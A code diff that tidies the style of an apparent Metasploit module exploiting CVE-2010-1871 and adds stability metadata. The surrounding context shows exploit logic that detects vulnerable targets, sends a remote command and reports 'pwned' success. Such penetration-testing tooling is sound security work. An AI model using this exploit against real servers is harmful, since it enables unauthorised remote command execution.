@@ -27,10 +27,15 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'License' => MSF_LICENSE,
         'References' => [
-          [ 'CVE', '2010-1871' ],
-          [ 'OSVDB', '66881']
+          ['CVE', '2010-1871'],
+          ['OSVDB', '66881']
         ],
-        'DisclosureDate' => '2010-07-19'
+        'DisclosureDate' => '2010-07-19',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
 
@@ -65,18 +70,18 @@ class MetasploitModule < Msf::Auxiliary
         }, 20
       )
 
-      if (res && res.headers['Location'] =~ (/java.lang.Runtime.exec%28java.lang.String%29/))
+      if res && res.headers['Location'] =~ /java.lang.Runtime.exec%28java.lang.String%29/
         flag_found_one = index
         print_status('Found right index at [' + index.to_s + '] - exec')
-      elsif (res && res.headers['Location'] =~ (/java.lang.Runtime\+java.lang.Runtime.getRuntime/))
+      elsif res && res.headers['Location'] =~ /java.lang.Runtime\+java.lang.Runtime.getRuntime/
         print_status('Found right index at [' + index.to_s + '] - getRuntime')
         flag_found_two = index
       else
-        print_status('Index [' + index.to_s + ']')
+        print_status("Index [#{index}]")
       end
     end
 
-    if (flag_found_one != 255 && flag_found_two != 255)
+    if flag_found_one != 255 && flag_found_two != 255
       print_status('Target appears VULNERABLE!')
       print_status('Sending remote command:' + datastore['CMD'])
 
@@ -89,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
         }, 20
       )
 
-      if (res && res.headers['Location'] =~ (/pwned=java.lang.UNIXProcess/))
+      if res && res.headers['Location'] =~ /pwned=java.lang.UNIXProcess/
         print_good('Exploited successfully')
       else
         print_error('Exploit failed')
